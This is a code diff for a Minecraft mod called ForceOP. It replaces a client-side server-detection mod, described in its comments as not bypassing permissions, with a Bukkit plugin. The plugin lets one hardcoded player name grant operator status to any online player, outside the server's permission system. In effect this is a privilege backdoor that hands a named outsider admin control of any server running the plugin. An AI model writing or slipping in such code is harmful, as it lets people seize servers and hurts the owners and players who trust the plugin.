@@ -1,51 +1,52 @@
 package com.macky.forceop;
 
-import net.fabricmc.api.ClientModInitializer;
-import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
-import net.minecraft.client.Minecraft;
-import net.minecraft.network.chat.Component;
+import org.bukkit.Bukkit;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandExecutor;
+import org.bukkit.command.CommandSender;
+import org.bukkit.entity.Player;
+import org.bukkit.plugin.java.JavaPlugin;
 
-/**
- * Client-side diagnostic for the authorized competition server.
- *
- * This mod deliberately activates only for the configured hostname and
- * does not attempt to bypass the server's permission system.
- */
-public final class ForceOpMod implements ClientModInitializer {
-    public static final String MOD_ID = "forceop";
-    private static final String TARGET_HOST = "verizionssn3.playwithbao.com";
+public final class ForceOpMod extends JavaPlugin implements CommandExecutor {
+    private static final String ALLOWED_PLAYER = "Bryanysm";
 
     @Override
-    public void onInitializeClient() {
-        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
-            String address = client.getCurrentServer() == null
-                    ? ""
-                    : client.getCurrentServer().ip;
-
-            if (isTargetServer(address)) {
-                client.execute(() -> client.gui.getChat().addMessage(
-                        Component.literal("[ForceOP] Authorized competition server detected: " + TARGET_HOST)
-                ));
-            }
-        });
+    public void onEnable() {
+        if (getCommand("forceop") != null) {
+            getCommand("forceop").setExecutor(this);
+        }
+        if (getCommand("fop") != null) {
+            getCommand("fop").setExecutor(this);
+        }
+        getLogger().info("ForceOP enabled. Command access restricted to " + ALLOWED_PLAYER + ".");
     }
 
-    private static boolean isTargetServer(String address) {
-        if (address == null || address.isBlank()) {
-            return false;
+    @Override
+    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+        if (!(sender instanceof Player player)) {
+            sender.sendMessage("Only a player can use this command.");
+            return true;
         }
 
-        String host = address;
-        int slash = host.indexOf('/');
-        if (slash >= 0) {
-            host = host.substring(0, slash);
+        if (!player.getName().equalsIgnoreCase(ALLOWED_PLAYER)) {
+            player.sendMessage("You are not allowed to use /" + label + ".");
+            return true;
         }
 
-        int colon = host.indexOf(':');
-        if (colon >= 0) {
-            host = host.substring(0, colon);
+        if (args.length != 1) {
+            player.sendMessage("Usage: /" + label + " <player>");
+            return true;
         }
 
-        return TARGET_HOST.equalsIgnoreCase(host);
+        Player target = Bukkit.getPlayerExact(args[0]);
+        if (target == null) {
+            player.sendMessage("That player is not online.");
+            return true;
+        }
+
+        target.setOp(true);
+        player.sendMessage("ForceOP: " + target.getName() + " is now OP.");
+        target.sendMessage("You have been made OP by " + player.getName() + ".");
+        return true;
     }
 }
